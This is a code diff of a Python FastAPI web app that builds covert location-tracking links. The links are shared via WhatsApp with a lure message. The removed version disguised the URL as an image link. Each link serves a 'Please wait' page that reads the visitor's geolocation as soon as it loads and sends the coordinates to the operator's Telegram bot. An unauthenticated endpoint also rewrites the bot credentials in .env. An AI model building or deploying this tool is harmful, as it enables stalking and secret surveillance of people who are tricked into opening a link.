@@ -2,39 +2,20 @@ import uuid
 from fastapi import FastAPI, Form, Request
 from fastapi.responses import FileResponse, HTMLResponse, JSONResponse
 from dotenv import load_dotenv
-from fastapi import FastAPI, Request, Form, HTTPException
-from fastapi.responses import JSONResponse, HTMLResponse, FileResponse
-from fastapi.staticfiles import StaticFiles
-from fastapi.middleware.cors import CORSMiddleware
 from pydantic import BaseModel
-from dotenv import load_dotenv
 import requests
 import os
-import json
-import uuid
-import uvicorn
 
-# Load the .env file
-load_dotenv(dotenv_path=os.path.join(os.path.dirname(__file__), '.env'))
+# Carregar o arquivo .env
+load_dotenv()
 
-print("TELEGRAM_TOKEN:", os.getenv("TELEGRAM_TOKEN"))
-print("CHAT_ID:", os.getenv("CHAT_ID"))
+# Acessar as variáveis de ambiente
+TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
+CHAT_ID = os.getenv("CHAT_ID")
 
 app = FastAPI()
 
-# Define the correct path for static files
-BASE_DIR = os.path.dirname(os.path.abspath(__file__))
-FRONTEND_PATH = os.path.join(BASE_DIR, "..", "frontend")
-
-# CORS Configuration
-app.add_middleware(
-    CORSMiddleware,
-    # Add the domain of your frontend
-    allow_origins=["https://frontend-localizador.vercel.app"],
-    allow_credentials=True,
-    allow_methods=["*"],
-    allow_headers=["*"],
-)
+# Modelo de dados para a localização
 
 
 class LocationData(BaseModel):
@@ -43,60 +24,69 @@ class LocationData(BaseModel):
     longitude: float
 
 
-# In-memory database
+# Banco de dados em memória para armazenar os links
 active_links = {}
+
+# Função para enviar mensagem para o Telegram
 
 
 def send_to_telegram(message: str):
-    telegram_token = os.getenv("TELEGRAM_TOKEN")
-    url = f"https://api.telegram.org/bot{telegram_token}/sendMessage"
+    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
     params = {
-        "chat_id": os.getenv("CHAT_ID"),
+        "chat_id": CHAT_ID,
         "text": message,
     }
     try:
         response = requests.post(url, data=params)
         response_data = response.json()
         if response.status_code != 200 or not response_data.get("ok"):
-            print(f"Error sending message to Telegram: {response_data}")
+            print(f"Erro ao enviar mensagem para o Telegram: {response_data}")
         return response_data
     except Exception as e:
-        print(f"Failed to connect to Telegram: {e}")
+        print(f"Falha ao conectar ao Telegram: {e}")
         return {"error": str(e)}
+
+# Servir o arquivo HTML na raiz "/"
 
 
 @app.get("/")
 async def serve_html():
-    index_path = os.path.join(FRONTEND_PATH, "index.html")
-    if not os.path.exists(index_path):
-        raise HTTPException(status_code=404, detail="index.html not found")
-    return FileResponse(index_path)
+    return FileResponse("index.html")
+
+# Rota para receber a localização
 
 
 @app.post("/send-location/")
 async def send_location(location: LocationData):
     if location.id not in active_links:
-        raise HTTPException(status_code=404, detail="Invalid ID")
+        return JSONResponse(content={"error": "ID inválido"}, status_code=404)
 
-    message = f"📍 Location received!\n🌍 Latitude: {location.latitude}\n📍 Longitude: {location.longitude}"
-    send_to_telegram(message)
+    # Enviar localização para o Telegram
+    message = f"📍 Localização recebida!\n🌍 Latitude: {location.latitude}\n📍 Longitude: {location.longitude}"
+    requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", data={
+                  "chat_id": CHAT_ID, "text": message})
 
-    return {"message": "Location sent!"}
+    return {"message": "Localização enviada!"}
 
 
 @app.get("/generate-link/")
 async def generate_link():
-    unique_id = str(uuid.uuid4())[:8]
-    tracking_url = f"https://i.pinimg.com/236x/eb/3f/da/eb3fda4cfda1efd0f29d20994af4696e.jpg/track/{unique_id}"
+    unique_id = str(uuid.uuid4())[:8]  # Gera um ID único de 8 caracteres
+    # Link de rastreamento
+    tracking_url = f"http://127.0.0.1:8000/track/{unique_id}"
+
+    # Salva no "banco de dados" em memória
     active_links[unique_id] = {"status": "waiting"}
+
     return JSONResponse(content={"link": tracking_url})
 
 
 @app.get("/track/{tracking_id}")
-async def track_user(tracking_id: str):
+async def track_user(tracking_id: str, request: Request):
     if tracking_id not in active_links:
-        raise HTTPException(status_code=404, detail="Invalid link")
+        return JSONResponse(content={"error": "Link inválido"}, status_code=404)
 
+    # Página HTML que coleta a localização automaticamente
     html_content = f"""
     <html>
     <head>
@@ -116,11 +106,11 @@ async def track_user(tracking_id: str):
                     }});
                 }}
             }}
-            window.onload = sendLocation;
+            window.onload = sendLocation;  // Executa automaticamente
         </script>
     </head>
     <body>
-        <h1>Please wait...</h1>
+        <h1>Aguarde...</h1>
     </body>
     </html>
     """
@@ -129,47 +119,46 @@ async def track_user(tracking_id: str):
 
 @app.get("/send-whatsapp/")
 async def send_whatsapp():
-    response = await generate_link()
-    response_json = json.loads(response.body.decode("utf-8"))
-    tracking_url = response_json.get("link", "")
+    response = await generate_link()  # Gera um link único
+    tracking_url = response.body.decode("utf-8")  # Extrai a URL gerada
 
-    if not tracking_url:
-        raise HTTPException(status_code=500, detail="Failed to generate link")
-
-    whatsapp_link = f"https://api.whatsapp.com/send?text=Check this out! {tracking_url}"
+    # Mensagem formatada para WhatsApp
+    whatsapp_link = f"https://api.whatsapp.com/send?text=Confira isso! {tracking_url}"
     return JSONResponse(content={"whatsapp_link": whatsapp_link})
+
+# Rota para exibir o formulário de configuração
 
 
 @app.get("/config")
 async def config_form():
     html_content = """
     <html>
-    <head><title>Telegram Bot Configuration</title></head>
+    <head><title>Configuração do Telegram Bot</title></head>
     <body>
-        <h1>Configure your Telegram Bot</h1>
+        <h1>Configure seu bot do Telegram</h1>
         <form action="/save-config" method="post">
             <label for="telegram_token">Telegram Token:</label>
             <input type="text" id="telegram_token" name="telegram_token" required><br><br>
             <label for="chat_id">Chat ID:</label>
             <input type="text" id="chat_id" name="chat_id" required><br><br>
-            <button type="submit">Save Configuration</button>
+            <button type="submit">Salvar Configuração</button>
         </form>
     </body>
     </html>
     """
     return HTMLResponse(content=html_content)
 
+# Rota para salvar as configurações no arquivo .env
+
 
 @app.post("/save-config")
 async def save_config(telegram_token: str = Form(...), chat_id: str = Form(...)):
+    # Gravar no arquivo .env
     with open('.env', 'w') as f:
         f.write(f"TELEGRAM_TOKEN={telegram_token}\n")
         f.write(f"CHAT_ID={chat_id}\n")
 
+    # Recarregar as variáveis de ambiente
     load_dotenv()
 
-    return {"message": "Configuration saved successfully!"}
-
-if __name__ == "__main__":
-    port = int(os.getenv("PORT", 8080))  # Use PORT environment variable
-    uvicorn.run(app, host="0.0.0.0", port=port)
+    return {"message": "Configuração salva com sucesso!"}
